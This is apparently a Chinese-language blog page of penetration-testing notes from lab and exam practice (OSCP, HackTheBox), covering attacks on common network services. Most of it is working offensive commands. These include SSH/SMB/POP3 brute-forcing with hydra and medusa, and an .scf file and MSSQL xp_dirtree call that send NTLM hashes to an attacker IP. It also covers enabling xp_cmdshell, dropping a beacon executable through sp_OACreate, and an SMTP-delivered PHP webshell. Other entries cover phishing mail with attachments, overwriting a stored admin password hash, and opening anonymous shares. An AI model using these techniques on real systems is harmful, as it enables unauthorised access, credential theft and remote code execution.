<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="noindex, nofollow"><title>常见服务 | 养猪日记</title>
<meta name=keywords content><meta name=description content="渗透主要遵循高危服务为先的策略，以下为打靶过程中的记录：
NFS
挂载：
sudo mount -t nfs 192.168.154.130:/home/user/storage ./storage

showmount 
-d：仅显示已被NFS客户端加载的目录； 
-e：显示NFS服务器上所有的共享目录。
SSH
爆破
medusa -h ip -U 文件 -P 文件 -M 协议（ssh） 稳定

crackmapexec ssh ip -u username.txt -p passwd.txt --continue-on 可以使用排除法

./cme -t 1 ssh hosts  -u use_user  -p pass 

hydra -L txt -P txt ip ssh 快
生成ssh公私钥
ssh-keygen -t rsa

上传文件名必须为：authorized_keys
连接问题
vim ~/.ssh/config 
HostKeyAlgorithms +ssh-rsa 
PubkeyAcceptedKeyTypes +ssh-rsa
FTP
ftp anonymous@ip

prompt off

切换传输模式： binary ascii
开关被动模式： passive

put 
get
mget
SMB
列出信息：
smbclient -L \\\\{TARGET_IP}\\ -U 用户名
连接：
smbclient //ip/目录

SMB扫描工具：
enum4linux -a -o ip 
挂载SMB：
mount -t cifs //<IP地址> 本地目录
sudo mount -t cifs -o username=&#34;qiu&#34;,password=&#34;password&#34; //192.168.5.103/qiu smb


匿名挂载：
sudo mount -t cifs -o rw,username=guest,password= '//10.10.10.103/Department Shares' smb

SMB罗列：
smbmap -r 目录 -H ip

批量下载不用确认：
prompt off


使用Kerberos协议登录smb:
在这种情况需要使用完全限定域名，格式为：hostname.domainname，同时，需要使用impacket工具包的smbclient.py：
python ../impacket/examples/smbclient.py -k scrm.local/ksimpson:ksimpson@DC1.scrm.local -dc-ip 10.10.11.168

完全限定域名获取方式：
https://github.com/CroweCybersecurity/ad-ldap-enum.git
python3 ad-ldap-enum.py -d scrm.local -l 10.10.11.168 -u ksimpson -p ksimpson 

或者使用get-tgt获取票据，然后修改环境变量：
sudo ntpdate -s 10.10.10.24

python3 ../impacket/examples/getTGT.py absolute.htb/m.lovegod:'AbsoluteLDAP2022!' -dc-ip 10.10.11.181

export KRB5CCNAME=svc_smb.ccache



爆破：
hydra -l you -P（此处p为大写，大小写此处代表的意义不同）+字典路径 smb://+靶机ip
enum4linux
enum4linux -a -o www.harvard.edu
确定目录可写入：
先挂载在本地："><meta name=author content="养猪日记"><link rel=canonical href=http://localhost:1313/posts/oscp/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/oscp/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=分类><span>分类</span></a></li><li><a href=http://localhost:1313/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">常见服务</h1><div class=post-meta><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;1137 words&nbsp;·&nbsp;养猪日记</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#nfs>NFS</a></li><li><a href=#ssh>SSH</a><ul><li><a href=#爆破>爆破</a></li><li><a href=#生成ssh公私钥>生成ssh公私钥</a></li><li><a href=#连接问题>连接问题</a></li></ul></li><li><a href=#ftp>FTP</a></li><li><a href=#smb>SMB</a></li></ul><ul><li><a href=#mssql>MSSQL</a><ul><li><a href=#xp_cmd>xp_cmd</a></li></ul></li><li><a href=#mongodb>mongodb</a></li><li><a href=#postgresql>PostgreSQL</a></li><li><a href=#rsync>RSYNC</a></li><li><a href=#tftp服务>TFTP服务</a></li><li><a href=#pop3-110>POP3 110</a></li><li><a href=#smtp-25>SMTP 25</a></li><li><a href=#winrm远程管理服务-59855986端口>WinRM远程管理服务 5985/5986端口</a></li><li><a href=#ldap>LDAP</a></li><li><a href=#redis>Redis</a></li><li><a href=#rpc>RPC</a></li><li><a href=#snmp-udp-161>SNMP UDP 161</a></li><li><a href=#netbios-139>NetBIOS 139</a></li></ul></nav></div></details></div><div class=post-content><p>渗透主要遵循高危服务为先的策略，以下为打靶过程中的记录：</p><h2 id=nfs>NFS<a hidden class=anchor aria-hidden=true href=#nfs>#</a></h2><pre tabindex=0><code>挂载：
sudo mount -t nfs 192.168.154.130:/home/user/storage ./storage

showmount 
-d：仅显示已被NFS客户端加载的目录； 
-e：显示NFS服务器上所有的共享目录。
</code></pre><h2 id=ssh>SSH<a hidden class=anchor aria-hidden=true href=#ssh>#</a></h2><h3 id=爆破>爆破<a hidden class=anchor aria-hidden=true href=#爆破>#</a></h3><pre tabindex=0><code>medusa -h ip -U 文件 -P 文件 -M 协议（ssh） 稳定

crackmapexec ssh ip -u username.txt -p passwd.txt --continue-on 可以使用排除法

./cme -t 1 ssh hosts  -u use_user  -p pass 

hydra -L txt -P txt ip ssh 快
</code></pre><h3 id=生成ssh公私钥>生成ssh公私钥<a hidden class=anchor aria-hidden=true href=#生成ssh公私钥>#</a></h3><pre tabindex=0><code>ssh-keygen -t rsa

上传文件名必须为：authorized_keys
</code></pre><h3 id=连接问题>连接问题<a hidden class=anchor aria-hidden=true href=#连接问题>#</a></h3><pre tabindex=0><code>vim ~/.ssh/config 
HostKeyAlgorithms +ssh-rsa 
PubkeyAcceptedKeyTypes +ssh-rsa
</code></pre><h2 id=ftp>FTP<a hidden class=anchor aria-hidden=true href=#ftp>#</a></h2><pre tabindex=0><code>ftp anonymous@ip

prompt off

切换传输模式： binary ascii
开关被动模式： passive

put 
get
mget
</code></pre><h2 id=smb>SMB<a hidden class=anchor aria-hidden=true href=#smb>#</a></h2><pre tabindex=0><code>列出信息：
smbclient -L \\\\{TARGET_IP}\\ -U 用户名
连接：
smbclient //ip/目录

SMB扫描工具：
enum4linux -a -o ip 
挂载SMB：
mount -t cifs //&lt;IP地址&gt; 本地目录
sudo mount -t cifs -o username=&#34;qiu&#34;,password=&#34;password&#34; //192.168.5.103/qiu smb


匿名挂载：
sudo mount -t cifs -o rw,username=guest,password= &#39;//10.10.10.103/Department Shares&#39; smb

SMB罗列：
smbmap -r 目录 -H ip

批量下载不用确认：
prompt off


使用Kerberos协议登录smb:
在这种情况需要使用完全限定域名，格式为：hostname.domainname，同时，需要使用impacket工具包的smbclient.py：
python ../impacket/examples/smbclient.py -k scrm.local/ksimpson:ksimpson@DC1.scrm.local -dc-ip 10.10.11.168

完全限定域名获取方式：
https://github.com/CroweCybersecurity/ad-ldap-enum.git
python3 ad-ldap-enum.py -d scrm.local -l 10.10.11.168 -u ksimpson -p ksimpson 

或者使用get-tgt获取票据，然后修改环境变量：
sudo ntpdate -s 10.10.10.24

python3 ../impacket/examples/getTGT.py absolute.htb/m.lovegod:&#39;AbsoluteLDAP2022!&#39; -dc-ip 10.10.11.181

export KRB5CCNAME=svc_smb.ccache



爆破：
hydra -l you -P（此处p为大写，大小写此处代表的意义不同）+字典路径 smb://+靶机ip
</code></pre><h1 id=enum4linux>enum4linux<a hidden class=anchor aria-hidden=true href=#enum4linux>#</a></h1><pre tabindex=0><code>enum4linux -a -o www.harvard.edu
</code></pre><p>确定目录可写入：
先挂载在本地：</p><pre tabindex=0><code>#!/bin/bash
list=$(find /mnt -type d)
for d in $list
do
    touch $d/x 2&gt;/dev/null
    if [ $? -eq 0 ]
    then
                echo $d &#34; is writable&#34;
    fi
done
</code></pre><p>relay打法，当有目录可写入时可尝试：</p><p>当用户浏览共享时，将自动建立从其系统到 SCF 文件中包含的 UNC 路径的连接。Windows 将尝试使用用户的用户名和密码对该共享进行身份验证。</p><p>.scf是Windows 资源管理器用户访问该文件的目录时打开SMB连接会触发NTLM认证从而获取NET-NETLM HASH pwn.scf文件内容如下</p><pre tabindex=0><code>[Shell]
Command=2
IconFile=\\10.10.16.8\share\pwn.ico
[Taskbar]
Command=ToggleDesktop
</code></pre><p>nmap smb信息获取：</p><pre tabindex=0><code>ls -1 /usr/share/nmap/scripts/smb*
</code></pre><h1 id=smb-命令行操作>smb 命令行操作<a hidden class=anchor aria-hidden=true href=#smb-命令行操作>#</a></h1><p>开启smb共享：</p><pre tabindex=0><code>https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%BC%80%E5%90%AFWindows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE%E5%85%B1%E4%BA%AB


 . .\Invoke-BuildAnonymousSMBServer.ps1
 Invoke-BuildAnonymousSMBServer -Path c:\inetpub\wwwroot -Mode Enable
</code></pre><pre tabindex=0><code>0x04 通过命令行开启可匿名访问的文件共享服务器
具体方法对应的命令如下：

1.启用Guest用户
net user guest /active:yes
2.将Everyone权限应用于匿名用户
REG ADD &#34;HKLM\System\CurrentControlSet\Control\Lsa&#34; /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f
3.指定匿名共享文件的位置
REG ADD &#34;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&#34; /v NullSessionShares /t REG_MULTI_SZ /d smb /f
4.将Guest用户从策略“拒绝从网络访问这台计算机”中移除
导出组策略：

secedit /export /cfg gp.inf /quiet
修改文件gp.inf，将SeDenyNetworkLogonRight = Guest修改为SeDenyNetworkLogonRight =，保存

重新导入组策略：

secedit /configure /db gp.sdb /cfg gp.inf /quiet
强制刷新组策略，立即生效(否则，重启后生效)：

gpupdate/force
5.设置文件共享
icacls c:\Windows\System32\spool\drivers\color\ /T /grant Everyone:r
net share share=c:\Windows\System32\spool\drivers\color\ /grant:everyone,full
至此，可匿名访问的文件共享服务器开启成功，访问的地址为//&lt;ip&gt;/smb



net use M: \\10.10.125.147\share /user:smbuser password

dir M:\
</code></pre><h2 id=mssql>MSSQL<a hidden class=anchor aria-hidden=true href=#mssql>#</a></h2><p>连接</p><pre tabindex=0><code>impacket中的mssqlclient.py 
命令： 
python3 mssqlclient.py domain\username:password@ip -windows-auth


使用票据登录：
export KRB5CCNAME=/home/kali/Desktop/HTB/Scrambled/administrator.ccache

mssqlclient.py -k dc1.scrm.local  （注意网上下载的可能会无反应）
使用pip安装后尝试： pip install --upgrade impacket
</code></pre><p>基础语法：</p><pre tabindex=0><code>查询数据库：
SELECT name FROM master..sysdatabases;
使用数据库：
use xx;
查询表：
SELECT name FROM sysobjects WHERE xtype = &#39;U&#39;;
查询数据：
select * from orcharddb.dbo.blog_Orchard_Users_UserPartRecord;
</code></pre><p><strong>relay:</strong></p><pre tabindex=0><code>EXEC MASTER.sys.xp_dirtree &#39;\\10.10.14.14\test&#39;, 1, 1

抓的hash可以直接用john破解
john --wordlist=/xx/xx hash.txt
</code></pre><h3 id=xp_cmd>xp_cmd<a hidden class=anchor aria-hidden=true href=#xp_cmd>#</a></h3><pre tabindex=0><code>EXEC sp_configure &#39;Show Advanced Options&#39;, 1; //允许修改高级参数 
reconfigure; 
EXEC sp_configure &#39;xp_cmdshell&#39;, 1; 开启xp_cmd 
RECONFIGURE; 
xp_cmdshell &#34;whoami&#34;;


文件落地：
xxd -ps beacon.exe hex.txt
DECLARE @DATA VARBINARY(MAX) = 0x-hex
        DECLARE @filepath VARCHAR(MAX) = &#39;C:\\Windows\\temp\\cs.exe&#39;
        DECLARE @ObjectToken INT
        EXEC sp_OACreate &#39;ADODB.Stream&#39;, @ObjectToken OUTPUT
        EXEC sp_OASetProperty @ObjectToken, &#39;Type&#39;, 1
        EXEC sp_OAMethod @ObjectToken, &#39;Open&#39;
        EXEC sp_OAMethod @ObjectToken, &#39;Write&#39;, NULL, @DATA
        EXEC sp_OAMethod @ObjectToken, &#39;SaveToFile&#39;, NULL, @filepath, 2
        EXEC sp_OAMethod @ObjectToken, &#39;Close&#39;
        EXEC sp_OADestroy @ObjectToken
        SELECT @filepath
</code></pre><h2 id=mongodb>mongodb<a hidden class=anchor aria-hidden=true href=#mongodb>#</a></h2><pre tabindex=0><code>连接：mongo ip 
查看db:show dbs 
使用数据库：use 数据库名 
查看集合：show collections; 
查看集合内容：db.【collection】.find() 
枚举数据库中的用户： 
mongo --port 端口 数据库名称 --eval &#34;db.admin.find().forEach(printjson);&#34; 
更新数据库内容： 
mongo --port 27117 ace --eval &#39;db.admin.update({&#34;_id&#34;:ObjectId(&#34;61ce278f46e0fb0012d47ee4&#34;)},{$set:{&#34;x_shadow&#34;:&#34;$6$jK3CUz9Ttn4yAf6z$P22Obhi4D4e045xvD4GukfQ6Icrp78/ICMFBnGJyxoS6dUjMYZMZDyosLHtleSdzHbAlbuNciW2tS4kIfUglp.&#34;}})&#39;
</code></pre><h2 id=postgresql>PostgreSQL<a hidden class=anchor aria-hidden=true href=#postgresql>#</a></h2><pre tabindex=0><code>连接： 
psql -U 用户名 -h IP -p 端口 
列出数据库： 
\list 
使用数据库： 
\c 数据库名称 
列出数据库表： 
\dt 
查询还是select: 
select * from table;
</code></pre><h2 id=rsync>RSYNC<a hidden class=anchor aria-hidden=true href=#rsync>#</a></h2><pre tabindex=0><code>列出可用文件： 
rsync --list-only {target_IP}:: 
复制文件到本地 
rsync {target_IP}::public/flag.txt flag.txt
</code></pre><h2 id=tftp服务>TFTP服务<a hidden class=anchor aria-hidden=true href=#tftp服务>#</a></h2><pre tabindex=0><code>tftp ip port 
不支持列出文件，只支持上传下载，多数利用情况下，可以通过其他方式获得显示
get 
put
</code></pre><h2 id=pop3-110>POP3 110<a hidden class=anchor aria-hidden=true href=#pop3-110>#</a></h2><p>邮箱服务可爆破或者登录，爆破使用hydra:</p><pre tabindex=0><code>hydra -L username -P passwd ip pop3
</code></pre><p>登录可使用thunderbird或者NC：</p><pre tabindex=0><code>nc 10.10.10.4 110

user seina 用户
pass scoobydoo2 密码

list 列出邮件
retr 1 查看邮件
</code></pre><h2 id=smtp-25>SMTP 25<a hidden class=anchor aria-hidden=true href=#smtp-25>#</a></h2><pre tabindex=0><code>nc 192.168.5.108 25 #连接邮件服务器 
helo root #标识用户身份 
mail from:&#34;ROOT &lt;?php system($_GET[&#39;a&#39;]);?&gt;&#34; #发件人，木马所在地 
rcpt to:root #收件人 
data #编辑 
. #编辑结束 
quit #退出nc

swaks工具
swaks --to itsupport@outdated.htb --from car@melo --server mail.outdated.htb --body &#34;http://10.10.16.4/&#34;

发送附件：
swaks --to nico@megabank.com --from cxk@cxk --server 10.10.10.77 --body &#34;123&#34; --attach cxk.rtf

sendEmail -f mac@megabank.com -t nico@megabank.com -u &#34;Invoice Attached&#34; -m &#34;You are overdue payment&#34; -a cxk.rtf -s 10.10.10.77 -v 

解释：
- `--to itsupport@outdated.htb`: 指定邮件的接收者地址为 `itsupport@outdated.htb`。
    
- `--from car@melo`: 指定邮件的发件人地址为 `car@melo`。
    
- `--server mail.outdated.htb`: 指定SMTP服务器的地址为 `mail.outdated.htb`。
    
- `--body &#34;http://10.10.16.4/&#34;`: 指定邮件的正文内容为 &#34;http://10.10.16.4/&#34;。这似乎是一个URL，可能是要在邮件正文中包含的链接。

配置账号密码：--auth-user maildmz  --auth-password &#34;DPuBT9tGCBrTbR&#34;

枚举，由于存在用户名和没有用户名的返回信息不一致，所以可以枚举：脚本如下，使用方式为name+ip
#!/usr/bin/python

import socket
import sys

if len(sys.argv) != 3:
        print(&#34;Usage: vrfy.py &lt;username&gt; &lt;target_ip&gt;&#34;)
        sys.exit(0)

# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Server
ip = sys.argv[2]
connect = s.connect((ip,25))

# Receive the banner
banner = s.recv(1024)

print(banner)

# VRFY a user
user = (sys.argv[1]).encode()
s.send(b&#39;VRFY &#39; + user + b&#39;\r\n&#39;)
result = s.recv(1024)

print(result)

# Close the socket
s.close()
</code></pre><p><strong>枚举用户名：</strong></p><pre tabindex=0><code>nmap --script smtp-enum-users ip
</code></pre><h2 id=winrm远程管理服务-59855986端口>WinRM远程管理服务 5985/5986端口<a hidden class=anchor aria-hidden=true href=#winrm远程管理服务-59855986端口>#</a></h2><pre tabindex=0><code>使用证书公私钥登录：
evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S
账号密码登录：
evil-winrm -i IP -u user -p passwd -S
下载文件：
download  xxx  xxx




使用kerberos登录：

sudo pwsh  
Install-Module -Name PSWSMan -Scope AllUsers  
Install-WSMan  
exit  
sudo pwsh  
enter-pssession -computername dc1.scrm.local -Credential MiscSvc@SCRM.LOCAL

或者申请证书：
export KRB5CCNAME=./out.ccache
evil-winrm -i dc.absolute.htb -r ABSOLUTE.HTB
</code></pre><h2 id=ldap>LDAP<a hidden class=anchor aria-hidden=true href=#ldap>#</a></h2><pre tabindex=0><code>leapsearch

用户名密码查询
ldapsearch -h 10.10.10.100 -p 389 -D SVC_TGS@active.htb -w GPPstillStandingStrong2k18

anonymous匿名查询查询基本信息：
ldapsearch -x -H ldap://10.10.10.161:389 -u &#39;&#39; -w &#39;&#39; -s base namingcontexts

查询域内所有用户名
ldapsearch -x -H ldap://10.10.10.161:389 -u &#39;&#39; -w &#39;&#39; -b &#34;DC=htb,DC=local&#34; &#34;(&amp;(objectCategory=person)(objectClass=user))&#34; |grep dn

awk:
ldapsearch -x -H ldap://192.168.224.122:389 -u &#39;&#39; -w &#39;&#39; -b &#34;DC=hutch,DC=offsec&#34; &#34;(&amp;(objectCategory=person)(objectClass=user))&#34; |grep dn |awk -F &#39;CN&#39; &#39;{ print $2 }&#39;|awk -F &#39;=&#39; &#39;{ print $2 }&#39;|awk -F &#39;,&#39; &#39;{ print $1 }&#39; &gt; user1.txt

进阶工具：

https://github.com/ropnop/windapsearch.git

安装工具：
sudo apt-get install libsasl2-dev python3-dev libldap2-dev libssl-dev
python3 -m pip install -r requirements.txt 

查询用户：
./windapsearch.py -d cascade.local -u &#39;&#39; -p &#39;&#39; -U --dc-ip 10.10.10.182

awk命令：
cat user2.txt|grep @hutch.offsec|awk -F &#39; &#39; &#39;{ print $2 }&#39;

查询用户所有信息：
./windapsearch.py -d cascade.local -u &#39;&#39; -p &#39;&#39; --dc-ip 10.10.10.182 -U --full


kerberos协议登录：
1、借用kinit获取票据：
安装：sudo apt-get install krb5-user
配置文件：/etc/krb5.conf：注意大小写

[libdefaults]
default_realm = ABSOLUTE.HTB
[realms]
ABSOLUTE.HTB = {
kdc = dc.absolute.htb
}
[domain_realm]
.absolute.htb = ABSOLUTE.HTB

申请：
kinit ksimpson（账户）
查看票据：
klist

查询，关键是那个-Y GSSAPI
ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b &#34;dc=absolute,dc=htb&#34;

如果出现报错，可以尝试：sudo apt install libsasl2-modules-gssapi-mit

安装相关环境：
sudo apt-cache search libsasl2
sudo apt-get install libsasl2-modules-gssapi-mit


查询objectSid：白银票据利用
ldapsearch -H ldap://dc1.scrm.local -D &#39;scrm.local\ksimpson&#39; -w &#39;ksimpson&#39; -Y GSSAPI -b &#34;cn=users,dc=scrm,dc=local&#34; | grep -i &#34;objectSid::&#34; | cut -d &#34;:&#34; -f3

将objectSid转换成sid的脚本：
需要注意的是，后面的-500或者-502 要删除：

#!/bin/bash  
OBJECT_ID=&#34;AQUAAAAAAAUVAAAAhQSCo0F98mxA04uX9gEAAA==&#34;  #修改这里
G=($(echo -n $OBJECT_ID | base64 -d -i | hexdump -v -e &#39;1/1 &#34; %02X&#34;&#39;))  

BESA2=${G[8]}${G[9]}${G[10]}${G[11]}  
BESA3=${G[12]}${G[13]}${G[14]}${G[15]}  
BESA4=${G[16]}${G[17]}${G[18]}${G[19]}  
BESA5=${G[20]}${G[21]}${G[22]}${G[23]}  
BERID=${G[24]}${G[25]}${G[26]}${G[27]}${G[28]}  
rustscan
LESA1=${G[2]}${G[3]}${G[4]}${G[5]}${G[6]}${G[7]}  
LESA2=${BESA2:6:2}${BESA2:4:2}${BESA2:2:2}${BESA2:0:2}  
LESA3=${BESA3:6:2}${BESA3:4:2}${BESA3:2:2}${BESA3:0:2}  
LESA4=${BESA4:6:2}${BESA4:4:2}${BESA4:2:2}${BESA4:0:2}  
LESA5=${BESA5:6:2}${BESA5:4:2}${BESA5:2:2}${BESA5:0:2}  
LERID=${BERID:6:2}${BERID:4:2}${BERID:2:2}${BERID:0:2}
LE_SID_HEX=${LESA1}-${LESA2}-${LESA3}-${LESA4}-${LESA5}-${LERID}
# Initial SID value which is used to construct actual SID  
SID=&#34;S-1&#34;  
# Convert LE_SID_HEX to decimal values and append it to SID as a string  
IFS=&#39;-&#39; read -ra ADDR &lt;&lt;&lt; &#34;${LE_SID_HEX}&#34;  
for OBJECT in &#34;${ADDR[@]}&#34;; do  
  SID=${SID}-$((16#${OBJECT}))  
done


echo ${SID}
</code></pre><h2 id=redis>Redis<a hidden class=anchor aria-hidden=true href=#redis>#</a></h2><pre tabindex=0><code>连接：
redis -h ip

密码存储：
C:\Program Files\Redis\redis.windows-service.conf
type redis.windows-service.conf | findstr requirepass

查询所有内容：
keys *

查询指定内容：
get xx
</code></pre><h2 id=rpc>RPC<a hidden class=anchor aria-hidden=true href=#rpc>#</a></h2><pre tabindex=0><code>登录RPC：  
rpcclient -U htb\\james mantis.htb.local

获取SID：
LOOKUPNAMES james（用户名）

空用户：
rpcclient -U &#39;&#39; 10.10.10.248
</code></pre><h2 id=snmp-udp-161>SNMP UDP 161<a hidden class=anchor aria-hidden=true href=#snmp-udp-161>#</a></h2><p>主要是软件情况</p><p>前置内容：</p><p>1.3.6.1.2.1.25.1.6.0 系统进程
1.3.6.1.2.1.25.4.2.1.2 运行程序
1.3.6.1.2.1.25.4.2.1.4 进程路径
1.3.6.1.2.1.25.2.3.1.4 存储单元
1.3.6.1.2.1.25.6.3.1.2 软件名称
1.3.6.1.4.1.77.1.2.25 用户帐户
1.3.6.1.2.1.6.13.1.3 TCP 本地端口</p><pre tabindex=0><code>用于获取信息
snmpwalk -c public -v1 -t 10 192.168.50.151


http://www.phreedom.org/software/onesixtyone/

echo public &gt; community
echo private &gt;&gt; community
echo manager &gt;&gt; community
for ip in $(seq 1 254); do echo 192.168.50.$ip; done &gt; ips

kali@kali:~$ onesixtyone -c community -i ips
</code></pre><pre tabindex=0><code>获取机器账户：
snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25

获取正在运行的程序：
snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2

获取监听端口：
snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3

枚举整个MIB树
snmpwalk -c public -v1 -t 10

查看扩展信息：
snmpwalk -c public -v1 192.168.200.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
 
</code></pre><p>敏感信息获取：</p><pre tabindex=0><code>sudo apt-get install snmp-mibs-downloader
</code></pre><h2 id=netbios-139>NetBIOS 139<a hidden class=anchor aria-hidden=true href=#netbios-139>#</a></h2><pre tabindex=0><code>用于获取信息，用户信息
sudo nbtscan -r 192.168.50.0/24
</code></pre><h1 id=一些特殊软件>一些特殊软件：<a hidden class=anchor aria-hidden=true href=#一些特殊软件>#</a></h1><pre tabindex=0><code>JDWP - Java Debug Wire Protocol 8000端口
aerospike数据库 3000端口
putty RDP 提权
screen-4.5.0 提权
.git githack
</code></pre></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=http://localhost:1313/posts/oscp/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB/><span class=title>« Prev</span><br><span>客户端攻击</span>
</a><a class=next href=http://localhost:1313/posts/oscp/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/><span class=title>Next »</span><br><span>文件传输</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>养猪日记</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>